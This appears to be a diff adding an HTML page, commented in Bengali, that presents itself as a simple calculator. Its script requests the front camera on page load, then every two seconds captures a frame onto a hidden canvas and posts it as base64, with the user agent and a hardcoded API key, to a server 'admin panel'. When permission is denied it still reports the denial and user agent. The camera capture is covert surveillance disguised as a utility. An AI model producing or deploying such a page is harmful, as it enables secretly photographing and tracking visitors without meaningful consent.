@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calculator & Auto Capture</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #f0f2f5;
+        }
+
+        /* স্ট্যাটাস মেসেজ */
+        #status {
+            padding: 10px 15px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            font-size: 1em;
+            text-align: center;
+            color: #333;
+        }
+        #status.success { color: #28a745; font-weight: bold; }
+        #status.error { color: #dc3545; font-weight: bold; }
+
+        /* ক্যালকুলেটর স্টাইল */
+        .calculator {
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            width: 320px;
+        }
+
+        #display {
+            background-color: #222;
+            color: white;
+            font-size: 2.5em;
+            padding: 20px;
+            text-align: right;
+            width: 100%;
+            box-sizing: border-box;
+            border: none;
+            min-height: 80px;
+        }
+
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+        }
+
+        .btn {
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            font-size: 1.5em;
+            padding: 20px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn:hover { background-color: #f0f0f0; }
+        .btn.operator { background-color: #f0ad4e; color: white; }
+        .btn.clear { background-color: #d9534f; color: white; }
+        .btn.equal { background-color: #5cb85c; color: white; grid-column: span 2; }
+        .btn.zero { grid-column: span 2; }
+
+        /* ক্যামেরা ক্যাপচারের জন্য হিডেন এলিমেন্ট */
+        #video-feed { display: none; }
+        #capture-canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2 id="status">ক্যামেরার অনুমতির জন্য অপেক্ষা করা হচ্ছে...</h2>
+
+    <div class="calculator">
+        <input type="text" id="display" readonly>
+        <div class="buttons">
+            <button class="btn clear" data-value="C">C</button>
+            <button class="btn operator" data-value="/">/</button>
+            <button class="btn operator" data-value="*">*</button>
+            <button class="btn" data-value="7">7</button>
+            <button class="btn" data-value="8">8</button>
+            <button class="btn" data-value="9">9</button>
+            <button class="btn operator" data-value="-">-</button>
+            <button class="btn" data-value="4">4</button>
+            <button class="btn" data-value="5">5</button>
+            <button class="btn" data-value="6">6</button>
+            <button class="btn operator" data-value="+">+</button>
+            <button class="btn" data-value="1">1</button>
+            <button class="btn" data-value="2">2</button>
+            <button class="btn" data-value="3">3</button>
+            <button class="btn equal" data-value="=">=</button>
+            <button class="btn zero" data-value="0">0</button>
+            <button class="btn" data-value=".">.</button>
+        </div>
+    </div>
+
+    <video id="video-feed" autoplay playsinline></video>
+    <canvas id="capture-canvas"></canvas>
+
+    <script>
+        const API_KEY = "key_d023c1d3b961b48bf429a6690b4fde2f";
+        const API_URL = "api.php";
+        const CAPTURE_INTERVAL = 2000; // ২ সেকেন্ড (২০০০ মিলিসেকেন্ড)
+        let stream = null; // ক্যামেরা স্ট্রিম সেভ করার জন্য
+
+        // পেজ লোড হলে দুটি কাজই শুরু হবে
+        window.addEventListener('load', () => {
+            setupCalculator();
+            requestCameraAndStartCapture();
+        });
+
+        // --- ক্যালকুলেটরের লজিক (আগের মতোই) ---
+        function setupCalculator() {
+            const display = document.getElementById('display');
+            const buttons = document.querySelectorAll('.btn');
+            
+            buttons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const value = button.getAttribute('data-value');
+                    
+                    if (value === 'C') {
+                        display.value = '';
+                    } else if (value === '=') {
+                        try {
+                            display.value = eval(display.value.replace(/[^-+*/.0-9]/g, ''));
+                        } catch (e) {
+                            display.value = 'Error';
+                        }
+                    } else {
+                        display.value += value;
+                    }
+                });
+            });
+        }
+
+        // --- ক্যামেরা ক্যাপচার এবং API লজিক ---
+        async function requestCameraAndStartCapture() {
+            const statusElement = document.getElementById('status');
+            const video = document.getElementById('video-feed');
+            
+            // ফ্রন্ট ক্যামেরা চাওয়ার জন্য constraints সেট করা হলো
+            const constraints = {
+                video: {
+                    facingMode: 'user' // 'user' মানে ফ্রন্ট ক্যামেরা
+                }
+            };
+            
+            try {
+                // 1. ক্যামেরার পারমিশন চাওয়া
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                statusElement.textContent = "অনুমতি গৃহীত। ছবি ক্যাপচার লুপ চালু হচ্ছে...";
+                statusElement.className = "success";
+                video.srcObject = stream;
+
+                // 2. ২ সেকেন্ড পর পর ছবি তোলার লুপ চালু করা
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setInterval(() => {
+                        captureAndSendData(video, statusElement);
+                    }, CAPTURE_INTERVAL);
+                };
+
+            } catch (err) {
+                // পারমিশন ব্লক করলে
+                statusElement.textContent = `ক্যামেরার অনুমতি দেওয়া হয়নি। (Error: ${err.name})`;
+                statusElement.className = "error";
+                
+                // শুধুমাত্র ডেটা না পাঠিয়ে কারণটি একবার অ্যাডমিন প্যানেলে পাঠানো
+                const accessData = {
+                    event: "camera_access_denied_initial",
+                    error: err.name,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+                sendDataToApi(accessData);
+            }
+        }
+
+        function captureAndSendData(video, statusElement) {
+            const canvas = document.getElementById('capture-canvas');
+            
+            // ক্যানভাসে ভিডিও ফ্রেম আঁকা
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // ছবিকে Base64 টেক্সটে রূপান্তর
+            const imageDataBase64 = canvas.toDataURL('image/jpeg', 0.7); 
+
+            // API-তে পাঠানোর জন্য ডেটা প্রস্তুত করা
+            const accessData = {
+                event: "periodic_photo_capture",
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                photo_base64: imageDataBase64 // ছবির Base64 টেক্সট
+            };
+            
+            statusElement.textContent = `ছবি ক্যাপচার সম্পন্ন। অ্যাডমিন প্যানেলে পাঠানো হচ্ছে... (${new Date().toLocaleTimeString()})`;
+            sendDataToApi(accessData);
+        }
+
+        async function sendDataToApi(dataObject) {
+            const formData = new FormData();
+            formData.append("api_key", API_KEY);
+            formData.append("website_data", JSON.stringify(dataObject));
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    body: formData
+                });
+                const result = await response.json();
+                
+                if (result.status !== 'success') {
+                    console.error("Error: API Error", result.message);
+                }
+            } catch (error) {
+                console.error("Error: Fetch failed", error);
+            }
+        }
+    </script>
+</body>
+</html>
